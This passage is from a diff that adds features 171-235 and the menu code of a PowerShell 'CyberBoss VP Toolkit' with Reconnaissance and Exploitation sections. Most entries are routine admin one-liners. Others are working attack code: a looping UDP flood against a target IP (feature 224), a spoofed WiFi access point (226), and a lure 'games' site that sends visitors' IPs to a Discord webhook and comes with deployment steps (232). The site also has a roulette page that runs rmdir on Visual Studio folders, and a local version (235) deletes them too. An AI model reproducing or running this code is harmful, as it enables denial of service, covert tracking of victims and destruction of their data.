+    '171' = { [Guid]::NewGuid() | Write-Host; Write-Log "Generated UUID" }
+    '172' = { Get-Date | Write-Host; Write-Log "Timestamped action" }
+    '173' = { Restart-Computer -Force; Write-Log "Restarted system" }
+    '174' = { Stop-Computer -Force; Write-Log "Shutdown system" }
+    '175' = { rundll32.exe user32.dll,LockWorkStation; Write-Log "Locked workstation" }
+    '176' = { Compress-Archive -Path "$env:TEMP\*" -DestinationPath "$env:TEMP\archive.zip"; Write-Log "Created ZIP" }
+    '177' = { Expand-Archive -Path "$env:TEMP\archive.zip" -DestinationPath "$env:TEMP\"; Write-Log "Extracted ZIP" }
+    '178' = { Write-Host "Network speed test requires external tool"; Write-Log "Attempted network speed test" }
+    '179' = { (Invoke-RestMethod "http://ifconfig.me/ip") | Write-Host; Write-Log "Got public IP" }
+    '180' = { (Invoke-RestMethod "http://ip-api.com/json/$targetIp") | Select-Object lat,lon | Write-Host; Write-Log "Geolocated IP" }
+    '181' = { Write-Host "QR code requires module"; Write-Log "Attempted QR code" }
+    '182' = { Import-Csv "$env:TEMP\data.csv" | Write-Host; Write-Log "Parsed CSV" }
+    '183' = { Get-Process | Export-Csv "$env:TEMP\proc.csv" -NoTypeInformation; Write-Log "Exported to CSV" }
+    '184' = { Import-Csv "$env:TEMP\proc.csv" | Write-Host; Write-Log "Imported from CSV" }
+    '185' = { Send-MailMessage -To "user@example.com" -From "boss@example.com" -Subject "Test" -Body "Hello" -SmtpServer "smtp.example.com"; Write-Log "Sent email" }
+    '186' = { Get-PSDrive C | Select-Object Used,Free | Write-Host; Write-Log "Checked disk space" }
+    '187' = { Remove-Item "$env:TEMP\*" -Recurse -Force; Write-Log "Cleared temp files" }
+    '188' = { Get-Counter "\Processor(_Total)\% Processor Time" | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue | Write-Host; Write-Log "Got CPU usage" }
+    '189' = { Get-CimInstance Win32_OperatingSystem | Select-Object FreePhysicalMemory,TotalVisibleMemorySize | Write-Host; Write-Log "Got memory usage" }
+    '190' = { Stop-Process -Id 1234 -Force; Write-Log "Killed process" }
+    '191' = { Start-Process "notepad.exe"; Write-Log "Started process" }
+    '192' = { Test-Connection "8.8.8.8" -Count 1 | Write-Host; Write-Log "Checked internet" }
+    '193' = { w32tm /resync; Write-Log "Synced system time" }
+    '194' = { "FakeUser$(Get-Random)" | Write-Host; Write-Log "Generated fake data" }
+    '195' = { "{0:N2} GB" -f ((Get-Item "$env:TEMP\file.txt").Length / 1GB) | Write-Host; Write-Log "Converted units" }
+    '196' = { $shell = New-Object -ComObject WScript.Shell; $shortcut = $shell.CreateShortcut("$env:TEMP\notepad.lnk"); $shortcut.TargetPath = "notepad.exe"; $shortcut.Save(); Write-Log "Created shortcut" }
+    '197' = { Remove-Item "$env:TEMP\file.txt" -Force; Write-Log "Securely deleted file" }
+    '198' = { Write-Host "File split requires logic"; Write-Log "Attempted file split" }
+    '199' = { Write-Host "File merge requires logic"; Write-Log "Attempted file merge" }
+    '200' = { Get-Acl "$env:TEMP\file.txt" | Select-Object Access | Write-Host; Write-Log "Checked file permissions" }
+    '201' = { $acl = Get-Acl "$env:TEMP\file.txt"; $rule = New-Object Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","Allow"); $acl.SetAccessRule($rule); Set-Acl "$env:TEMP\file.txt" $acl; Write-Log "Set file permissions" }
+    '202' = { Get-Content "$env:TEMP\file.txt" -Encoding Byte | ForEach-Object { "{0:X2} " -f $_ } | Write-Host; Write-Log "Generated hex dump" }
+    '203' = { [uri]::EscapeDataString("http://example.com/test space") | Write-Host; Write-Log "Encoded URL" }
+    '204' = { [uri]::UnescapeDataString("http%3A%2F%2Fexample.com%2Ftest%20space") | Write-Host; Write-Log "Decoded URL" }
+    '205' = { "test123" -match "^[a-z]+[0-9]+$" | Write-Host; Write-Log "Tested regex" }
+    '206' = { Get-Random -Minimum 100000 -Maximum 999999 | Write-Host; Write-Log "Generated OTP" }
+    '207' = { [Net.ServicePointManager]::SecurityProtocol | Write-Host; Write-Log "Checked TLS version" }
+    '208' = { New-SelfSignedCertificate -DnsName "localhost" -CertStoreLocation "Cert:\LocalMachine\My"; Write-Log "Created self-signed cert" }
+    '209' = { Export-Certificate -Cert (Get-Item Cert:\LocalMachine\My\*) -FilePath "$env:TEMP\cert.cer"; Write-Log "Exported cert" }
+    '210' = { Import-Certificate -FilePath "$env:TEMP\cert.cer" -CertStoreLocation "Cert:\LocalMachine\My"; Write-Log "Imported cert" }
+    '211' = { Get-ChildItem Cert:\LocalMachine\My | Select-Object NotAfter | Write-Host; Write-Log "Checked cert validity" }
+    '212' = { [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes((New-Object Byte[] 16)) | ForEach-Object { "{0:X2}" -f $_ } | Write-Host; Write-Log "Generated entropy" }
+    '213' = { 1..10000 | ForEach-Object { [Math]::Sqrt($_) }; Write-Log "Simulated CPU load" }
+    '214' = { Measure-Command { 1..1000 | ForEach-Object { Set-Content "$env:TEMP\test$_" "test" } } | Write-Host; Write-Log "Benchmarked disk I/O" }
+    '215' = { $env:Path.Split(";") | Write-Host; Write-Log "Listed environment paths" }
+    '216' = { Clear-DnsClientCache; Write-Log "Cleared DNS cache" }
+    '217' = { (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Write-Host; Write-Log "Displayed uptime" }
+    '218' = { "{0}.{1}.{2}.{3}" -f (Get-Random -Min 1 -Max 255),(Get-Random -Min 0 -Max 255),(Get-Random -Min 0 -Max 255),(Get-Random -Min 1 -Max 255) | Write-Host; Write-Log "Generated random IP" }
+    '219' = { Get-Process | Select-Object Id,HandleCount; Write-Log "Checked process handles" }
+    '220' = { "{0:X2}-{1:X2}-{2:X2}-{3:X2}-{4:X2}-{5:X2}" -f (Get-Random -Min 0 -Max 255),(Get-Random -Min 0 -Max 255),(Get-Random -Min 0 -Max 255),(Get-Random -Min 0 -Max 255),(Get-Random -Min 0 -Max 255),(Get-Random -Min 0 -Max 255) | Write-Host; Write-Log "Generated random MAC" }
+    '221' = { Get-CimInstance Win32_Battery | Select-Object EstimatedChargeRemaining | Write-Host; Write-Log "Monitored battery status" }
+    '222' = { 
+        Write-Host "Ear-Piercing HZ Generator with Flashing Colors - 3000-8000 Hz" -ForegroundColor Yellow
+        $freq = Read-Host "Enter frequency (3000-8000 Hz, e.g., 6000)"
+        $duration = Read-Host "Enter duration per beep (ms, e.g., 500)"
+        $loops = Read-Host "Enter number of loops (e.g., 10, 0 to stop manually)"
+        if ([int]$freq -lt 3000 -or [int]$freq -gt 8000) { Write-Host "Frequency must be between 3000-8000 Hz!" -ForegroundColor Red; return }
+        if ([int]$duration -lt 100) { Write-Host "Duration must be at least 100 ms!" -ForegroundColor Red; return }
+        Add-Type -TypeDefinition "using System; public class Tone { public static void Play(int freq, int duration) { Console.Beep(freq, duration); }}" -Language CSharp
+        $colors = @("Red", "Green", "Blue", "Yellow")
+        $originalColor = [Console]::BackgroundColor
+        Write-Host "Generating $freq Hz tone with flashing colors... Press Ctrl+C to stop if no loop limit set" -ForegroundColor Green
+        try {
+            if ([int]$loops -eq 0) {
+                while ($true) { 
+                    $color = $colors | Get-Random
+                    [Console]::BackgroundColor = $color
+                    Clear-Host
+                    Write-Host "SCREAMING AT $freq Hz" -ForegroundColor White
+                    [Tone]::Play($freq, $duration)
+                    Start-Sleep -Milliseconds 50
+                }
+            } else {
+                for ($i = 0; $i -lt [int]$loops; $i++) { 
+                    $color = $colors | Get-Random
+                    [Console]::BackgroundColor = $color
+                    Clear-Host
+                    Write-Host "SCREAMING AT $freq Hz - Loop $i/$loops" -ForegroundColor White
+                    [Tone]::Play($freq, $duration)
+                    Start-Sleep -Milliseconds 50
+                }
+            }
+        } finally {
+            [Console]::BackgroundColor = $originalColor
+            Clear-Host
+        }
+        Write-Log "Generated $freq Hz ear-piercing tone with flashing colors for $duration ms, $loops loops"
+    }
+    '223' = { New-NetFirewallRule -DisplayName "RestrictGuestWiFi" -Direction Inbound -InterfaceType Wireless -Action Block; Write-Log "Restricted guest WiFi access" }
+    '224' = { 
+        Write-Host "IP Delay WiFi Slammer - Flooding $targetIp every minute to slow WiFi" -ForegroundColor Yellow
+        Write-Host "Press Ctrl+C to stop" -ForegroundColor Red
+        while ($true) {
+            Write-Host "Slamming $targetIp at $(Get-Date)" -ForegroundColor Green
+            1..5000 | ForEach-Object { 
+                $udp = New-Object Net.Sockets.UdpClient
+                $udp.Connect($targetIp, 80)
+                $udp.Send((New-Object Byte[] 2048), 2048)
+                $udp.Close()
+            }
+            Write-Host "Flood sent, waiting 60 seconds..." -ForegroundColor Cyan
+            Start-Sleep -Seconds 60
+        }
+        Write-Log "Ran IP Delay WiFi Slammer on $targetIp"
+    }
+    '225' = { $headers = @{"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"; "Referer" = "https://google.com"; "X-Forwarded-For" = (Get-Random -Min 1 -Max 255).ToString() + "." + (Get-Random -Min 0 -Max 255) + "." + (Get-Random -Min 0 -Max 255) + "." + (Get-Random -Min 1 -Max 255)}; $headers | Format-Table -AutoSize; Write-Log "Generated fake HTTP headers" }
+    '226' = { $ssid = Read-Host "Enter spoofed SSID"; netsh wlan set hostednetwork mode=allow ssid="$ssid" key="password123"; netsh wlan start hostednetwork; Write-Host "Spoofed AP '$ssid' started"; Write-Log "Spoofed WiFi AP: $ssid" }
+    '227' = { Write-Host "   .-""""""""-.
+ .-'          '-.
+: ,          : '
+ `._         _.' 
+    `"'"""""'"` "; Write-Log "Generated ASCII art" }
+    '228' = { Test-Connection $targetIp -Count 10 | Select-Object ResponseTime | Write-Host; Write-Log "Monitored network latency" }
+    '229' = { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("{ENTER}"); Write-Log "Simulated keypress" }
+    '230' = { Get-CimInstance Win32_VideoController | Select-Object CurrentRefreshRate,AdapterRAM | Write-Host; Write-Log "Checked GPU usage" }
+    '231' = { Get-Random -Minimum 1024 -Maximum 65535 | Write-Host; Write-Log "Generated random port" }
+
+    # ========== NEW UTILITIES (232-235) ==========
+    '232' = { 
+        $siteDir = "$env:TEMP\CyberBoss_IPGrabber_Site"
+        if (Test-Path $siteDir) { Remove-Item $siteDir -Recurse -Force }
+        New-Item -Path $siteDir -ItemType Directory | Out-Null
+
+        $indexContent = @"
+<?php
+if (\$_SERVER['REQUEST_METHOD'] === 'GET') {
+    \$ip = \$_SERVER['REMOTE_ADDR'];
+    \$userAgent = \$_SERVER['HTTP_USER_AGENT'];
+    \$time = date('Y-m-d H:i:s');
+    \$webhookUrl = '$webhookUrl';
+    \$data = array('content' => "**New Visitor!**\\nIP: \$ip\\nUser-Agent: \$userAgent\\nTime: \$time");
+    \$options = array('http' => array('header' => "Content-Type: application/json", 'method' => 'POST', 'content' => json_encode(\$data)));
+    \$context = stream_context_create(\$options);
+    file_get_contents(\$webhookUrl, false, \$context);
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CyberBoss Fun Zone</title>
+    <style>
+        body { background-color: #1a1a1a; color: #ff00ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        h1 { color: #00ff00; }
+        button { background-color: #ff0000; color: #fff; border: none; padding: 10px 20px; cursor: pointer; margin: 5px; }
+        button:hover { background-color: #ff5555; }
+        #gameArea { margin-top: 20px; }
+        #rouletteResult { color: #ffff00; }
+        canvas { border: 1px solid #00ff00; }
+    </style>
+</head>
+<body>
+    <h1>Welcome to the CyberBoss Fun Zone!</h1>
+    <p>Play some games while we secretly grab your IP, Boss!</p>
+    <button onclick="startSnake()">Play Snake</button>
+    <button onclick="startTicTacToe()">Play Tic-Tac-Toe</button>
+    <button onclick="playRoulette()">Russian Roulette</button>
+    <div id="gameArea"></div>
+    <div id="rouletteResult"></div>
+    <script src="games.js"></script>
+</body>
+</html>
+"@
+
+        $gamesJsContent = @"
+function startSnake() {
+    const gameArea = document.getElementById('gameArea');
+    gameArea.innerHTML = '<canvas id="snakeCanvas" width="400" height="400"></canvas>';
+    const canvas = document.getElementById('snakeCanvas');
+    const ctx = canvas.getContext('2d');
+    let snake = [{x: 10, y: 10}];
+    let food = {x: 15, y: 15};
+    let dx = 1, dy = 0;
+    let score = 0;
+
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'ArrowUp' && dy === 0) { dx = 0; dy = -1; }
+        if (e.key === 'ArrowDown' && dy === 0) { dx = 0; dy = 1; }
+        if (e.key === 'ArrowLeft' && dx === 0) { dx = -1; dy = 0; }
+        if (e.key === 'ArrowRight' && dx === 0) { dx = 1; dy = 0; }
+    });
+
+    function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        snake.forEach((part, i) => {
+            ctx.fillStyle = i === 0 ? '#00ff00' : '#ff00ff';
+            ctx.fillRect(part.x * 20, part.y * 20, 18, 18);
+        });
+        ctx.fillStyle = '#ff0000';
+        ctx.fillRect(food.x * 20, food.y * 20, 18, 18);
+    }
+
+    function update() {
+        const head = {x: snake[0].x + dx, y: snake[0].y + dy};
+        if (head.x < 0 || head.x >= 20 || head.y < 0 || head.y >= 20 || snake.some(s => s.x === head.x && s.y === head.y)) {
+            alert('Game Over! Score: ' + score);
+            return;
+        }
+        snake.unshift(head);
+        if (head.x === food.x && head.y === food.y) {
+            score++;
+            food = {x: Math.floor(Math.random() * 20), y: Math.floor(Math.random() * 20)};
+        } else {
+            snake.pop();
+        }
+        draw();
+        setTimeout(update, 100);
+    }
+    update();
+}
+
+function startTicTacToe() {
+    const gameArea = document.getElementById('gameArea');
+    gameArea.innerHTML = '<div id="board" style="display: grid; grid-template-columns: repeat(3, 100px); width: 300px; margin: 20px auto;"></div>';
+    const board = document.getElementById('board');
+    let cells = Array(9).fill(null);
+    let currentPlayer = 'X';
+
+    for (let i = 0; i < 9; i++) {
+        const cell = document.createElement('div');
+        cell.style = 'width: 100px; height: 100px; border: 2px solid #00ff00; font-size: 40px; display: flex; align-items: center; justify-content: center; cursor: pointer;';
+        cell.onclick = () => makeMove(i);
+        board.appendChild(cell);
+    }
+
+    function makeMove(index) {
+        if (!cells[index]) {
+            cells[index] = currentPlayer;
+            board.children[index].textContent = currentPlayer;
+            if (checkWin()) {
+                alert(currentPlayer + ' wins!');
+                return;
+            }
+            if (cells.every(c => c)) { alert('Draw!'); return; }
+            currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
+        }
+    }
+
+    function checkWin() {
+        const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+        return wins.some(w => w.every(i => cells[i] === currentPlayer));
+    }
+}
+
+function playRoulette() {
+    const chamber = Math.floor(Math.random() * 6) + 1;
+    const pull = Math.floor(Math.random() * 6) + 1;
+    const resultDiv = document.getElementById('rouletteResult');
+    resultDiv.textContent = 'Spinning the chamber... Pulling the trigger...';
+    setTimeout(() => {
+        if (chamber === pull) {
+            resultDiv.textContent = '*BANG!* You lost! Deleting Visual Studio...';
+            fetch('delete_vs.php', { method: 'POST' });
+        } else {
+            resultDiv.textContent = '*Click* You survived this time, Boss!';
+        }
+    }, 2000);
+}
+"@
+
+        $deleteVsContent = @"
+<?php
+if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
+    \$vsPaths = ['C:\\Program Files (x86)\\Microsoft Visual Studio\\', 'C:\\Program Files\\Microsoft Visual Studio\\'];
+    foreach (\$vsPaths as \$path) {
+        if (file_exists(\$path)) {
+            exec("rmdir /s /q \\"".\$path."\\"");
+        }
+    }
+    \$webhookUrl = '$webhookUrl';
+    \$data = array('content' => "**Russian Roulette Loss!**\\nVisual Studio deleted from IP: ".\$_SERVER['REMOTE_ADDR']);
+    \$options = array('http' => array('header' => "Content-Type: application/json", 'method' => 'POST', 'content' => json_encode(\$data)));
+    \$context = stream_context_create(\$options);
+    file_get_contents(\$webhookUrl, false, \$context);
+}
+?>
+"@
+
+        $indexContent | Out-File "$siteDir\index.php" -Encoding UTF8
+        $gamesJsContent | Out-File "$siteDir\games.js" -Encoding UTF8
+        $deleteVsContent | Out-File "$siteDir\delete_vs.php" -Encoding UTF8
+        Compress-Archive -Path "$siteDir\*" -DestinationPath "$siteDir\CyberBoss_IPGrabber_Site.zip"
+
+        Write-Host "IP Grabber Site Generated!" -ForegroundColor Green
+        Write-Host "Location: $siteDir" -ForegroundColor Yellow
+        Write-Host "1. Replace '$webhookUrl' with your Discord webhook URL in index.php and delete_vs.php"
+        Write-Host "2. Upload index.php, games.js, and delete_vs.php to a PHP server"
+        Write-Host "3. Share the URL and watch IPs hit your Discord!"
+        Write-Log "Generated IP Grabber Site at $siteDir"
+    }
+    '233' = { 
+        Add-Type -AssemblyName System.Windows.Forms
+        $form = New-Object Windows.Forms.Form
+        $form.Text = "CyberBoss Snake Game"
+        $form.Width = 420
+        $form.Height = 450
+        $canvas = New-Object Windows.Forms.PictureBox
+        $canvas.Width = 400
+        $canvas.Height = 400
+        $canvas.Top = 10
+        $canvas.Left = 10
+        $form.Controls.Add($canvas)
+        $g = $canvas.CreateGraphics()
+        $snake = @(@{x=10; y=10})
+        $food = @{x=15; y=15}
+        $dx = 1; $dy = 0
+        $score = 0
+
+        $form.Add_KeyDown({
+            if ($_.KeyCode -eq "Up" -and $dy -eq 0) { $script:dx = 0; $script:dy = -1 }
+            if ($_.KeyCode -eq "Down" -and $dy -eq 0) { $script:dx = 0; $script:dy = 1 }
+            if ($_.KeyCode -eq "Left" -and $dx -eq 0) { $script:dx = -1; $script:dy = 0 }
+            if ($_.KeyCode -eq "Right" -and $dx -eq 0) { $script:dx = 1; $script:dy = 0 }
+        })
+
+        $timer = New-Object Windows.Forms.Timer
+        $timer.Interval = 100
+        $timer.Add_Tick({
+            $head = @{x=$snake[0].x + $dx; y=$snake[0].y + $dy}
+            if ($head.x -lt 0 -or $head.x -ge 20 -or $head.y -lt 0 -or $head.y -ge 20 -or ($snake | Where-Object { $_.x -eq $head.x -and $_.y -eq $head.y })) {
+                $timer.Stop()
+                [Windows.Forms.MessageBox]::Show("Game Over! Score: $score")
+                $form.Close()
+                return
+            }
+            $snake = ,$head + $snake
+            if ($head.x -eq $food.x -and $head.y -eq $food.y) {
+                $script:score++
+                $food = @{x=(Get-Random -Max 20); y=(Get-Random -Max 20)}
+            } else {
+                $snake = $snake[0..($snake.Length-2)]
+            }
+            $g.Clear([Drawing.Color]::Black)
+            $snake | ForEach-Object { $g.FillRectangle([Drawing.Brushes]::Green, $_.x * 20, $_.y * 20, 18, 18) }
+            $g.FillRectangle([Drawing.Brushes]::Red, $food.x * 20, $food.y * 20, 18, 18)
+        })
+        $timer.Start()
+        $form.ShowDialog() | Out-Null
+        Write-Log "Played Snake Game, Score: $score"
+    }
+    '234' = { 
+        Add-Type -AssemblyName System.Windows.Forms
+        $form = New-Object Windows.Forms.Form
+        $form.Text = "CyberBoss Tic-Tac-Toe"
+        $form.Width = 320
+        $form.Height = 350
+        $cells = New-Object 'object[,]' 3,3
+        $currentPlayer = "X"
+
+        for ($i = 0; $i -lt 3; $i++) {
+            for ($j = 0; $j -lt 3; $j++) {
+                $btn = New-Object Windows.Forms.Button
+                $btn.Width = 100
+                $btn.Height = 100
+                $btn.Left = $j * 100 + 10
+                $btn.Top = $i * 100 + 10
+                $btn.Font = New-Object Drawing.Font("Arial", 40)
+                $btn.Add_Click({
+                    $btn = $this
+                    if ($btn.Text -eq "") {
+                        $btn.Text = $script:currentPlayer
+                        $x = [int](($btn.Left - 10) / 100)
+                        $y = [int](($btn.Top - 10) / 100)
+                        $script:cells[$y,$x] = $script:currentPlayer
+                        if ((0..2 | Where-Object { $script:cells[$_,0] -eq $script:currentPlayer -and $script:cells[$_,1] -eq $script:currentPlayer -and $script:cells[$_,2] -eq $script:currentPlayer }) -or
+                            (0..2 | Where-Object { $script:cells[0,$_] -eq $script:currentPlayer -and $script:cells[1,$_] -eq $script:currentPlayer -and $script:cells[2,$_] -eq $script:currentPlayer }) -or
+                            ($script:cells[0,0] -eq $script:currentPlayer -and $script:cells[1,1] -eq $script:currentPlayer -and $script:cells[2,2] -eq $script:currentPlayer) -or
+                            ($script:cells[0,2] -eq $script:currentPlayer -and $script:cells[1,1] -eq $script:currentPlayer -and $script:cells[2,0] -eq $script:currentPlayer)) {
+                            [Windows.Forms.MessageBox]::Show("$script:currentPlayer wins!")
+                            $form.Close()
+                        } elseif (@($script:cells | Where-Object { $_ }).Count -eq 9) {
+                            [Windows.Forms.MessageBox]::Show("Draw!")
+                            $form.Close()
+                        } else {
+                            $script:currentPlayer = if ($script:currentPlayer -eq "X") {"O"} else {"X"}
+                        }
+                    }
+                })
+                $form.Controls.Add($btn)
+            }
+        }
+        $form.ShowDialog() | Out-Null
+        Write-Log "Played Tic-Tac-Toe Game"
+    }
+    '235' = { 
+        $chamber = Get-Random -Minimum 1 -Maximum 7
+        $pull = Get-Random -Minimum 1 -Maximum 7
+        Write-Host "Spinning the chamber... Pulling the trigger..." -ForegroundColor Yellow
+        Start-Sleep -Seconds 2
+        if ($chamber -eq $pull) {
+            Write-Host "*BANG!* You lost! Deleting Visual Studio..." -ForegroundColor Red
+            $vsPaths = @("C:\Program Files (x86)\Microsoft Visual Studio\", "C:\Program Files\Microsoft Visual Studio\")
+            foreach ($path in $vsPaths) {
+                if (Test-Path $path) {
+                    if ($isAdmin) {
+                        Remove-Item $path -Recurse -Force
+                        Write-Host "Deleted: $path" -ForegroundColor Green
+                    } else {
+                        Write-Host "Admin privileges required to delete $path" -ForegroundColor Red
+                    }
+                }
+            }
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content="**Russian Roulette Loss!**`nVisual Studio deleted locally"} | ConvertTo-Json) -ContentType "application/json"
+            Write-Log "Russian Roulette lost - attempted Visual Studio deletion"
+        } else {
+            Write-Host "*Click* You survived this time, Boss!" -ForegroundColor Green
+            Write-Log "Russian Roulette survived"
+        }
+    }
+}
+
+# ========== MENU FUNCTIONS ==========
+
+function Show-FeatureCategories {
+    Write-Host "`n=== MAIN MENU ===" -ForegroundColor Cyan
+    Write-Host "1. Reconnaissance (Features 1-62)" -ForegroundColor Green
+    Write-Host "2. Exploitation (Features 63-114)" -ForegroundColor Red
+    Write-Host "3. Defense (Features 115-167)" -ForegroundColor Blue
+    Write-Host "4. Utilities (Features 168-235)" -ForegroundColor Yellow
+    Write-Host "5. Settings" -ForegroundColor White
+    Write-Host "6. Search Features" -ForegroundColor Magenta
+    Write-Host "`n0. Exit" -ForegroundColor Gray
+}
+
+function Show-SampleFeatures {
+    Write-Host "`n=== SAMPLE FEATURES ===" -ForegroundColor Yellow
+    Write-Host "1. Check Execution Policy" -ForegroundColor Green
+    Write-Host "63. Generate Random Password" -ForegroundColor Red
+    Write-Host "115. Check Firewall Status" -ForegroundColor Blue
+    Write-Host "168. Convert to Base64" -ForegroundColor Yellow
+    Write-Host "232. Generate IP Grabber Site" -ForegroundColor Magenta
+}
+
+function Show-QuickStart {
+    Write-Host "`n=== QUICK START ===" -ForegroundColor Magenta
+    Write-Host "Enter a feature number (1-235), use search (6), or select a category" -ForegroundColor White
+    Write-Host "Admin privileges required for some features - Stay sharp, Boss!" -ForegroundColor Red
+}
+
+function Show-FeaturesInRange {
+    param(
+        [int]$start,
+        [int]$end,
+        [string]$category
+    )
+    do {
+        Clear-Host
+        Write-Host "`n=== $($category.ToUpper()) ($start-$end) ===" -ForegroundColor Cyan
+        $features = $featureMap.Keys | Where-Object { [int]$_ -ge $start -and [int]$_ -le $end } | Sort-Object { [int]$_ }
+        if ($features.Count -eq 0) { Write-Host "No features available in this category!" -ForegroundColor Yellow; Pause; return }
+        foreach ($f in $features) {
+            $desc = if ($featureDescriptions.ContainsKey($f)) { $featureDescriptions[$f] } else { "Feature $f" }
+            Write-Host "$f. $desc" -ForegroundColor Green
+        }
+        $feature = Read-Host "`nSelect feature (or 'back' to return)"
+        if ($feature -eq 'back') { return }
+        if ($featureMap.ContainsKey($feature)) {
+            try { & $featureMap[$feature] } catch { Write-Host "Feature execution failed: $_" -ForegroundColor Red; Write-Log "Feature $feature execution failed: $_" }
+        } else { Write-Host "Invalid feature!" -ForegroundColor Red }
+        Pause
+    } while ($true)
+}
+
+function Show-SearchMenu {
+    do {
+        Clear-Host
+        Write-Host "`n=== SEARCH FEATURES ===" -ForegroundColor Cyan
+        $searchTerm = Read-Host "Enter search term (or 'back' to return)"
+        if ($searchTerm -eq 'back') { return }
+        $results = $featureDescriptions.GetEnumerator() | Where-Object { $_.Value -match [regex]::Escape($searchTerm) } | Sort-Object Name
+        if ($results.Count -eq 0) {
+            Write-Host "No features found matching '$searchTerm'!" -ForegroundColor Yellow
+        } else {
+            Write-Host "`n=== SEARCH RESULTS ===" -ForegroundColor Green
+            foreach ($result in $results) {
+                Write-Host "$($result.Name). $($result.Value)" -ForegroundColor Green
+            }
+            $feature = Read-Host "`nSelect feature number to run (or 'back' to search again)"
+            if ($feature -eq 'back') { continue }
+            if ($featureMap.ContainsKey($feature)) {
+                try { & $featureMap[$feature] } catch { Write-Host "Feature execution failed: $_" -ForegroundColor Red; Write-Log "Feature $feature execution failed: $_" }
+            } else { Write-Host "Invalid feature number!" -ForegroundColor Red }
+        }
+        Pause
+    } while ($true)
+}
+
+function Show-ReconMenu { Show-FeaturesInRange -start 1 -end 62 -category "Reconnaissance" }
+function Show-ExploitMenu { Show-FeaturesInRange -start 63 -end 114 -category "Exploitation" }
+function Show-DefenseMenu { Show-FeaturesInRange -start 115 -end 167 -category "Defense" }
+function Show-UtilitiesMenu { Show-FeaturesInRange -start 168 -end 235 -category "Utilities" }
+
+function Show-SettingsMenu {
+    do {
+        Clear-Host
+        Write-Host "`n=== SETTINGS ===" -ForegroundColor Cyan
+        Write-Host "Current Target IP: $targetIp"
+        Write-Host "Current Target Domain: $targetDomain"
+        Write-Host "Log File: $logFile"
+        Write-Host "`n1. Change Target IP"
+        Write-Host "2. Change Target Domain"
+        Write-Host "3. View Log File"
+        Write-Host "4. Clear Log File"
+        Write-Host "`n0. Back to Main Menu"
+        $choice = Read-Host "`nSelect option"
+        switch ($choice) {
+            '1' { $script:targetIp = Read-Host "Enter new target IP"; Write-Log "Target IP changed to $targetIp" }
+            '2' { $script:targetDomain = Read-Host "Enter new target domain"; Write-Log "Target domain changed to $targetDomain" }
+            '3' { if (Test-Path $logFile) { notepad $logFile } else { Write-Host "No log file yet!" -ForegroundColor Yellow } }
+            '4' { if (Test-Path $logFile) { Clear-Content $logFile; Write-Host "Log cleared!" -ForegroundColor Green; Write-Log "Log file cleared" } else { Write-Host "No log file yet!" -ForegroundColor Yellow } }
+            '0' { return }
+            default { Write-Host "Invalid choice!" -ForegroundColor Red }
+        }
+        if ($choice -ne '0') { Pause }
+    } while ($true)
+}
+
+function Show-MainMenu {
+    do {
+        Show-Header
+        Show-FeatureCategories
+        Show-SampleFeatures
+        Show-QuickStart
+        $choice = Read-Host "`nSelect category (0-5)"
+        switch ($choice) {
+            '1' { Show-ReconMenu }
+            '2' { Show-ExploitMenu }
+            '3' { Show-DefenseMenu }
+            '4' { Show-UtilitiesMenu }
+            '5' { Show-SettingsMenu }
+            '0' { $script:running = $false }
+            default { Write-Host "Invalid choice, Boss!" -ForegroundColor Red; Start-Sleep -Seconds 1 }
+        }
+    } while ($running)
+}
+
+# ========== MAIN EXECUTION ==========
+
+if ($menu) {
+    Show-MainMenu
+} else {
+    Show-Header
+    Write-Host "`nCyberBoss VP Toolkit - Running sample features..." -ForegroundColor Yellow
+    try {
+        if ($featureMap.ContainsKey('1')) { & $featureMap['1'] }
+        if ($featureMap.ContainsKey('56')) { & $featureMap['56'] }
+        if ($featureMap.ContainsKey('109')) { & $featureMap['109'] }
+        if ($featureMap.ContainsKey('160')) { & $featureMap['160'] }
+    } catch {
+        Write-Host "Error executing sample features: $_" -ForegroundColor Red
+        Write-Log "Error executing sample features: $_"
+    }
+    Pause
+    Show-MainMenu
+}
+
+Write-Host "`nCyberBoss VP Toolkit session completed. Log file: $logFile" -ForegroundColor Green
